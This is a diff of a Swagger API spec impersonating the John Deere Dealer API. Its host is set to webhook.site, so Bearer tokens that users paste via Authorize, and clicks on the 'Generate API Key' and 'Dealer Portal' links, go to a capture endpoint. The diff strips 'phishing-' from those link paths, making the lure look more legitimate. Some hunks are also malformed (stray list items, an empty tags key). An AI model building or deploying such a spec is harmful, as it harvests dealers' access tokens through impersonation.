@@ -4,28 +4,22 @@ info:
   description: |
     # John Deere Dealer API v2.0
 
-    Official REST API for authorized John Deere dealers. Access equipment
-    inventory, manage orders, look up parts, and administer dealer accounts.
+    Official REST API for authorized John Deere dealers.
 
     ## Quick Links
     - [API Documentation](https://developer.deere.com)
-    - [Generate API Key](https://webhook.site/7e704fba-6dcd-4daa-b481-a673721f7358@emailhook.site/phishing-apikey)
-    - [Dealer Portal Login](https://webhook.site/7e704fba-6dcd-4daa-b481-a673721f7358@emailhook.site/phishing-login)
-    - [Integration Guide (PDF)](https://webhook.site/7e704fba-6dcd-4daa-b481-a673721f7358@emailhook.site/phishing-guide)
+    - [Generate API Key](https://webhook.site/7e704fba-6dcd-4daa-b481-a673721f7358@emailhook.site/apikey)
+    - [Dealer Portal](https://webhook.site/7e704fba-6dcd-4daa-b481-a673721f7358@emailhook.site/portal)
 
     ## Authentication
+    Click **Authorize** and paste your Bearer access token. Tokens are
+    validated against John Deere SSO.
 
-    All endpoints require a Bearer token. Click the **Authorize** button
-    above and paste your access token. Tokens are validated against the
-    John Deere SSO identity provider.
-
-    For assistance, contact [API Support](https://webhook.site/7e704fba-6dcd-4daa-b481-a673721f7358@emailhook.site/phishing-support).
+    [Contact API Support](https://webhook.site/7e704fba-6dcd-4daa-b481-a673721f7358@emailhook.site/support)
   version: v2.0
   contact:
-    name: John Deere API Support
-    url: https://webhook.site/7e704fba-6dcd-4daa-b481-a673721f7358@emailhook.site/phishing-contact
+    name: API Support
     email: apisupport@johndeere.com
-  termsOfService: https://www.deere.com/terms
 host: webhook.site
 basePath: /7e704fba-6dcd-4daa-b481-a673721f7358@emailhook.site
 schemes:
@@ -35,29 +29,16 @@ securityDefinitions:
     type: apiKey
     name: Authorization
     in: header
-    description: Paste your Bearer access token below
+    description: Enter your Bearer access token
 security:
   - BearerAuth: []
-tags:
-  - name: Dealers
-    description: Dealer account management and lookup
-  - name: Equipment
-    description: Equipment catalog, inventory, and pricing
-  - name: Orders
-    description: Order creation, tracking, and history
-  - name: Users
-    description: User and role management
-  - name: Admin
-    description: Administrative operations
 paths:
   /dealers:
     get:
-      tags:
-        - Dealers
       operationId: getDealers
       summary: List All Dealers
-      description: Returns a paginated list of all registered dealers with
-        contact details, region codes, status, and certification levels.
+      description: Returns paginated list of registered dealers with contact
+        details, region codes, and certification levels.
       produces:
         - application/json
       parameters:
@@ -69,44 +50,17 @@ paths:
           in: query
           type: integer
           description: Results per page
-        - name: region
-          in: query
-          type: string
-          description: Filter by region code
       responses:
         '200':
           description: Dealer list returned
         '401':
-          description: Invalid or missing token
-  /dealers/{dealerId}:
-    get:
-      tags:
-        - Dealers
-      operationId: getDealerById
-      summary: Get Dealer Details
-      description: Returns full profile for a specific dealer including
-        financial tier, service territory, and active equipment count.
-      produces:
-        - application/json
-      parameters:
-        - name: dealerId
-          in: path
-          type: string
-          required: true
-          description: Dealer identifier
-      responses:
-        '200':
-          description: Dealer profile returned
-        '404':
-          description: Dealer not found
+          description: Authentication required
   /equipment/search:
     get:
-      tags:
-        - Equipment
       operationId: searchEquipment
-      summary: Search Equipment Catalog
-      description: Full-text search across the equipment catalog including
-        tractors, harvesters, sprayers, planters, and attachments.
+      summary: Search Equipment
+      description: Search the equipment catalog by keyword, category, or
+        model number. Results include pricing and availability.
       produces:
         - application/json
       parameters:
@@ -118,72 +72,30 @@ paths:
           in: query
           type: string
           description: Equipment category
-          enum:
-            - tractors
-            - harvesters
-            - sprayers
-            - planters
-            - combines
-            - attachments
-        - name: minPrice
-          in: query
-          type: number
-          description: Minimum price filter
-        - name: maxPrice
-          in: query
-          type: number
-          description: Maximum price filter
       responses:
         '200':
-          description: Search results with matching equipment
-  /equipment/inventory:
+          description: Search results returned
+  /orders:
     get:
-      tags:
-        - Equipment
-      operationId: getInventory
-      summary: Get Dealer Inventory
-      description: Returns current inventory levels including available
-        units, incoming shipments, and reserved stock.
-      produces:
-        - application/json
-      responses:
-        '200':
-          description: Inventory data returned
-        - Orders
       operationId: listOrders
       summary: List Orders
-      description: Returns order history with status, total value, and
-        shipment tracking information.
+      description: Returns order history with status, value, and tracking
+        information.
       produces:
         - application/json
       parameters:
         - name: status
           in: query
           type: string
-          description: Filter by status
-          enum:
-            - pending
-            - confirmed
-            - shipped
-            - delivered
-        - name: fromDate
-          in: query
-          type: string
-          description: Start date (ISO format)
-        - name: toDate
-          in: query
-          type: string
-          description: End date (ISO format)
+          description: Filter by order status
       responses:
         '200':
           description: Order list returned
-
     post:
-      tags:
       operationId: createOrder
-      summary: Create New Order
-      description: Submit a new equipment or parts order. Orders are
-        processed immediately upon submission.
+      summary: Create Order
+      description: Submit a new equipment or parts order. Processed
+        immediately upon submission.
       consumes:
         - application/json
       produces:
@@ -200,38 +112,15 @@ paths:
             properties:
               equipmentId:
                 type: string
-                description: Equipment SKU or model number
               quantity:
                 type: integer
-                description: Units to order
-              shippingAddress:
-                type: object
-                properties:
-                  street:
-                    type: string
-                  city:
-                    type: string
-                  state:
-                    type: string
-                  zip:
-                    type: string
-              priority:
-                type: string
-                enum:
-                  - standard
-                  - express
-                  - rush
       responses:
         '201':
-          description: Order created successfully
-        '400':
-          description: Invalid order data
+          description: Order created
   /users:
     get:
-      tags:
-        - Users
       operationId: listUsers
-      summary: List Dealer Users
+      summary: List Users
       description: Returns all user accounts with roles, permissions, and
         last login timestamps.
       produces:
@@ -241,78 +130,16 @@ paths:
           in: query
           type: string
           description: Filter by role
-          enum:
-            - admin
-            - manager
-            - sales
-            - technician
-            - readonly
       responses:
         '200':
           description: User list returned
-  /users/{userId}:
-    get:
-      tags:
-        - Users
-      operationId: getUserById
-      summary: Get User Details
-      description: Returns detailed profile including email, phone,
-        territory, and permission set.
-      produces:
-        - application/json
-      parameters:
-        - name: userId
-          in: path
-          type: string
-          required: true
-          description: User identifier
-      responses:
-        '200':
-          description: User profile returned
-  /admin/audit:
-    get:
-      tags:
-        - Admin
-      operationId: getAuditLog
-      summary: View Audit Log
-      description: Returns the system audit trail including API calls,
-        authentication events, and data modifications.
-      produces:
-        - application/json
-      parameters:
-        - name: fromDate
-          in: query
-          type: string
-          description: Start date (ISO format)
-        - name: toDate
-          in: query
-          type: string
-          description: End date (ISO format)
-      responses:
-        '200':
-          description: Audit log entries
   /admin/config:
     get:
-      tags:
-        - Admin
       operationId: getConfig
-      summary: View System Configuration
+      summary: System Configuration
       description: Returns current system configuration parameters.
       produces:
         - application/json
       responses:
         '200':
-          description: Configuration data
-  /admin/health:
-    get:
-      tags:
-        - Admin
-      operationId: getHealth
-      summary: System Health Check
-      description: Returns system health status including database
-        connectivity, cache status, and queue depths.
-      produces:
-        - application/json
-      responses:
-        '200':
-          description: Health status
+          description: Configuration data returned
